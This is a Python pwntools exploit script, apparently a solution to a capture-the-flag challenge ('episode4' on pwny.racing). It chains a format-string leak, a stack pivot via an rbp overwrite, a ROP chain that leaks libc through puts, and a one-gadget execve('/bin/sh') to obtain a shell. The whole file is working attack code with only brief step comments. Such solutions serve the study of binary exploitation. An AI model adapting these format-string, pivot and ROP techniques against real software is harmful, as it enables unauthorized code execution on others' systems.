#!/usr/bin/python
from pwn import *
import sys

HOST = 'challenge.pwny.racing'
PORT = 11532

# context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])    # open new window

STACK     = 0x38      # distance from stack leak to trampoline buffer
BASE      = 0xb7f     # distance from binary leak to binary base
LIBC      = 0x185510  # distance from strncmp@GOT to libc base

MAGIC     = 0x04f322  # one shot magic gadget

PIVOT_BUF = 0x202238
POP_RBP   = 0x840
LEAVE_RET = 0x9e5

DEBUG = False
LOCAL = True
if len(sys.argv) > 1:
    LOCAL = False
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if LOCAL:
    io = process('./episode4')
else:
    io = remote(HOST, PORT)

if LOCAL and DEBUG:
    gdb.attach(io.pid, 'brva 0xafa\nbrva 0xc6d\nbrva 0xa4a')

# step 1: use fsb to get some leaks
io.recvuntil(': ')
io.sendline('%11$p.%13$p')
io.recvuntil(': ')
leaks = io.recvline().strip().split('.')

io.recvuntil(': ')
io.sendline('yes sir')

stack = int(leaks[0], 16) - STACK
base  = int(leaks[1], 16) - BASE

log.info('stack: 0x%012x' % stack)
log.info('base:  0x%012x' % base)

# step 2: use fsb to alter two lowest bytes of future rbp to pivot to trampoline
io.recvuntil(': ')
io.send('%'+str(stack & 0xffff)+'c%12$hn')
io.recvuntil(': ')
io.recvuntil(': ')
io.sendline('yes sir')

# step 3: plant rop to leak libc and read another payload over this one
pay1  = '\x00'*512
pay1 += p64(base+0x000cd3)  # pop rdi ; ret
pay1 += p64(base+0x201f90)  # GOT
pay1 += p64(base+0x000760)  # puts()
pay1 += p64(base+0x000a4a)  # read(stdin, data, 0x400) ; ret
pay1 += cyclic(1024-len(pay1))

io.recvuntil(': ')
io.send(pay1)

# step 4: trigger trampoline bounce to ropchain
io.recvuntil('nope): ')
io.send(p64(base+POP_RBP)+p64(base+0x202238)+p64(base+LEAVE_RET))

# step 5: read leak
leak = io.recvline().strip()
leak = u64(leak+'\x00\x00')
libc = leak - LIBC

log.info('leak:  0x%012x' % leak)
log.info('libc:  0x%012x' % libc)

# step 6: write second payload
pay2  = '\x00'*512
pay2 += p64(base+0x00073e)*8  # ret
pay2 += p64(libc+MAGIC)        # execve(/bin/sh, NULL, environ)
pay2 += '\x00'*(1024-len(pay2))

io.send(pay2)

# step 6: collect shell
io.sendline('id')
log.success('got shell: %s' % io.recvline().strip())

io.interactive()
sys.exit(0)

